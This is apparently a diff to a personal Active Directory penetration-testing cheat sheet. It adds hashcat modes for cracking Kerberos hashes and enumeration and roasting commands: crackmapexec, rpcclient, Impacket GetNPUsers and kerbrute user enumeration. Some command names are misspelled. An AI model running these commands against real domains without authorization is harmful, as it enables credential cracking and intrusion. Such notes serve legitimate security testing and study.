@@ -21,7 +21,7 @@ Cracking Captured HASH
 
 => cracking kerberos hash
 ----------------------------------------
-#hashcat -m 13100 kerberosHash.txt /usr/share/wordlists/ rockyou.txt --force
+#hashcat -m 13100 kerberosHash.txt /usr/share/wordlists/ rockyou.txt --force      //13100 [$krb5tgs$] or 18200 [$krb5asrep$]
 ----------------------------------------------------------------------------
 
 SMB Relay
@@ -97,5 +97,19 @@ Kerboroasting
 GetUserSPNs.py <domain>/username:password -dc-ip <domainIP> -request
 OR
 python3 GetUserSPNs.py <domain>/username:password -dc-host <full domain> -k -no-pass -request     // if NTLM is disabled
+
+
+##########################################MISCELANEOUS COMMANDS##################################################
+
+> crackmapexec smb <ip/cidr>
+> crackmapexec smb <ip/cidr> --shares
+> rpcclients <ip>
+> Impacket tool > GetNPUSer.py <domain>/<username>
+
+Bruteforcing | kerbrute
+--------------------------------------------------------------------------------
+#kerbrute userenum --dc <ip> -d <domain> user.txt
+
+
 
 
